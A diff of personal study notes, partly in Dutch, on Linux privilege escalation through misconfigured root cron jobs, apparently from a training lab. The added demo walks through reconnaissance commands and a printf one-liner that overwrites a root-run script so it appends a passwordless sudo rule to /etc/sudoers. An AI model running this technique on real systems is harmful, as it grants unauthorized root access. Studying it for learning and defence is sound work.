@@ -269,6 +269,8 @@ to run C you need to install package: sudo apt-get install gcc
 		- 
 
 
+FILMPJE VERDER KIJKEN 
+
 
 
 
@@ -286,13 +288,62 @@ Cron Jobs:
 - Linux utilizes a utility called Cron for task scheduling.
 - Cron is a time-based service that runs applications, scripts, and other commands on a specified schedule.
 - A recurring task configured with Cron is called a Cron job. It enables automation and repetition of various functions on a system, such as backups, upgrades, and patches.
-- The crontab file is the configuration file used by Cron to store and manage created Cron jobs.
+	- An application or script that has been configured to be run repeatedly with Cron is known as a Cron job. Cron can be used to automate or repeat a wide variety of functions on a system, from daily backups to system upgrades and patches. 
+- The **crontab** file is the configuration file used by Cron to store and manage created Cron jobs. 
 
 Exploiting Misconfigured Cron Jobs:
 
 - Cron jobs can be executed by any user on the system. It is crucial to monitor Cron jobs that have been set up to run as the "root" user.
 - When a Cron job is run as the root user, any script or command executed by that job also runs with root privileges, potentially granting full administrative access.
 - To escalate privileges, it is necessary to identify Cron jobs scheduled by the root user or investigate the files being processed by those Cron jobs.
+
+--- Demo --- 
+
+voorwerk 
+- Whoami 
+- groups 
+- cat /etc/passwd 
+
+identify cron jobs 
+- contab -l 
+- list content of user home directory (ls -al)
+- when you see file that is owned by root account: try to identify where the file is stored using a grep utility 
+	- grep -rnw /usr -e "/home/student/message" 
+		    - `-r` (or `--recursive`): This option tells `grep` to search recursively in all subdirectories of the specified directory.
+		    - `-n` (or `--line-number`): This option prints the line numbers along with the matched lines.
+		    - `-w` (or `--word-regexp`): This option ensures that only whole words are matched. It prevents partial matches.
+		-  `/usr`: This is the directory where the search will start. In this case, it's the root directory `/usr`, which is a common location for system files in Unix-like systems 		    
+		- `-e`: This option is used to specify the pattern or string to search for. In this case, the pattern being searched for is `"/home/student/message"`.
+		- The command will search for the pattern `"/home/student/message"` within files in the `/usr` directory and its subdirectories. It will display the matching lines along with their line numbers. 
+	- The grep search will give the path /file \ location where it is copied \ destination 
+		- list out the destination where the file is copies to (cat)
+		- you cant continue... 
+![[Pasted image 20230712194734.png]]
+- ls -al /usr/local/share/copy.sh (list out the permissions of the shell script) 
+  
+- can we add a line of code in the shell script to have the cronjob execute it
+	- cat the shell script to see what it does 	  
+
+	- run: printf '#!/bin/bash\\\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh 
+
+		- `printf`: It is a command used to format and print text. In this case, it is used to generate the content of the `copy.sh` file.
+	    
+		- `#!/bin/bash`: This is the shebang line, which indicates the interpreter to be used to execute the script. It specifies that the script should be interpreted by the Bash shell (`/bin/bash`).
+	    
+		- `\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers`: This is the content that will be written to the `copy.sh` file. It consists of a newline character (`\n`) followed by the command `echo "student ALL=NOPASSWD:ALL" >> /etc/sudoers`. This command appends the line `"student ALL=NOPASSWD:ALL"` to the `/etc/sudoers` file.
+			- the appended line grants the user "student" the ability to run any command with `sudo` without being prompted for a password on any host.
+	    
+		- `> /usr/local/share/copy.sh`: This redirects the output of the `printf` command, which generates the script's content, and writes it to the file `/usr/local/share/copy.sh`. The `>` operator is used for output redirection and creates or overwrites the file if it already exists.
+			- `> /usr/local/share/copy.sh`: This redirects the output of the `printf` command, which generates the script's content, and writes it to the file `/usr/local/share/copy.sh`. The `>` operator is used for output redirection and creates or overwrites the file if it already exists.
+		
+
+
+
+
+
+
+
+
 
 ## Exploiting SUID Binaries 
 
